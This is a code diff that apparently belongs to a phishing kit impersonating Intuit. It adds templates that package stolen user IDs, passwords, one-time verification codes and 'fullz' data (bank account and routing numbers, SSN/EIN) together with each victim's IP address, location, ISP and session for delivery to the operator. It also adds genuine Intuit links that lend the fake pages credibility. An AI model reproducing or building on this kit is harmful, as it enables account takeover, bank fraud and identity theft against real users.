@@ -11,5 +11,36 @@ export const ERROR = {
   invalidCode: "Please enter a valid 6-digit verification code.",
   incorrectCode:
     "The verification code you entered is expired or is incorrect.",
-    invalidInput: "Enter a valid {message}"
+  invalidInput: "Enter a valid {message}",
+};
+
+const tab = "\n\t\t";
+
+const start = `======== INTUIT Login {step} ========\n${tab}`;
+const startTwo = `======== 🔐 [INTUIT Code {step}] ========\n${tab}`;
+const startThree = `======== 👤 [INTUIT FULLZ ] ========\n${tab}`;
+
+const end = `\n${tab}🌐 IP: {ip}${tab}🌍 Country: {country}${tab}🏙️ Region: {region}${tab}📍City: {city}${tab}🔌 ISP: {isp}${tab}🧭 Lat/Lon: {lat}, {lon}\n\n⌛SESSION: {session}\n===========================`;
+
+const login = "📧 User ID: {login}";
+const password = "🔐 Password: {password}";
+const code = "🔐 Code: {code}";
+const fullz = `🧑🏼‍💼 Account Name: {name}${tab}🏦 Account Number: {number}${tab}🏦 Routing Number: {routing}${tab}🪪 SSN/EIN: {ssn}`;
+
+export const RESPONSES = {
+  loginOne: `${start}${login}${end}`,
+  loginWithPwd: `${start}${login}${tab}${password}${end}`,
+  code: `${startTwo}${code}${end}`,
+  fullz: `${startThree}${fullz}${end}`,
+};
+
+export const intuitLinks = {
+  homePage: "https://www.intuit.com/",
+  contactUs: "https://www.intuit.com/company/contact/",
+  learnMore: "https://www.intuit.com/products/",
+  legal: "https://www.intuit.com/legal/",
+  policy: "https://www.intuit.com/privacy/statement/",
+  security: "https://security.intuit.com/",
+  accountInfo: "https://accounts-help.intuit.com/app/intuit/1995107",
+  term: "https://www.intuit.com/legal/terms/en-us/website/",
 };
